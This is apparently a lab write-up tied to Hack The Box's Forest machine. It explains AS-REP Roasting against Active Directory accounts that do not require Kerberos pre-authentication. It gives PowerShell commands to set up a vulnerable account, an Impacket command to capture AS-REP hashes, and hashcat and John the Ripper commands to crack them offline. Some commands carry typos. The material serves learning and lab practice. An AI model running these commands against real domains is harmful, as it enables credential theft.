[Forest HTB](https://www.hackthebox.com/machines/forest)

**Target Enviornment** : Active Directory
**Purpose** : Extract TGTs from user accounts that do **not require Kerberos pre-authentication**, allowing offline password cracking

---

### What is AS-REP Roasting?

AS-REP Roasting is a kerberos attack targetting domain user accounts with the **Do not require Kerberos pre-authentication** flag enabled.

#### How it works

Normally, Kerberos authentication requires users to prove their identity via pre-authentication.
However, if pre-auth is disabled:

1. An attacker can send authentication request to the KDC **without knowing the password**.
2. The KDC responds with an **AS-REP (Authentication Server Reply)** message
3. This AS-REP contains data encrypted with the user's password hash
4. The attacker can perform **offline brute-force** or directory attacker to recover the plaintext password

---

### Lab Setup

```powershell
poweershell.exe -nop -ep bypass
```

#### Step 1. Define a password

```powershell
$PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"
```

#### Step 2. Create a user account

```powershell
New-ADUser -Name "User-asrep-roast" -SamAccountName "User-asrep-roast" -AccountPassword $PASSWORD -Enabled $true -PasswordNeverExpires $true -Description "AS-REP-Roast vulnerable account"
```

#### Step 3. Disable pre-authentication

```powershell
Set-ADAccountControl -Identify "User-asrep-roast" -DoesNotRequirePreAuth $true
```

#### Step 4. Verify users with pre-auth disabled

```powershell
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
```

---

### Attacking (Capturing and Cracking the AS-REP Hash)

#### I. Using Impacket (Linux/Python)

```cmd
GetNPUsers.py -sc-ip <IP> armour.local/ -usersfile users.txt -no-pass
```

#### Cracking the Hash

**With hashcat**

```bash
hashcat -m 18200 asrep_hash.txt rockyou.txt
```

**John the Ripper**

```bash
john --wordlist=rockyou.txt asrep_hash.txt
```

